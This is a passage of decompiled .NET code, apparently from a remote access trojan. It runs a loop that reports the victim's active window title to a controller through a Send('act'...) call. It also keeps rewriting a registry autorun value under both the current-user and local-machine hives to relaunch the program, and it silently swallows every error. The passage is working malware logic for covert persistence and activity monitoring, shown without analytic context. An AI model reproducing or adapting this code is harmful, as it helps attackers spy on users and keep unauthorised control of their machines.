						Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
				}
				if (num >= 8)
				{
					num = 0;
					string text2 = ACT();
					if (Operators.CompareString(text, text2, false) != 0)
					{
						text = text2;
						Send("act" + Y + text2);
					}
				}
				if (!Isu)
				{
					continue;
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue(sf + "\\" + RG, ""), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)F).get_Registry().get_LocalMachine().GetValue(sf + "\\" + RG, ""), (object)("\"" + LO.FullName + "\" .."), false))
					{
						((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(sf, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}
}
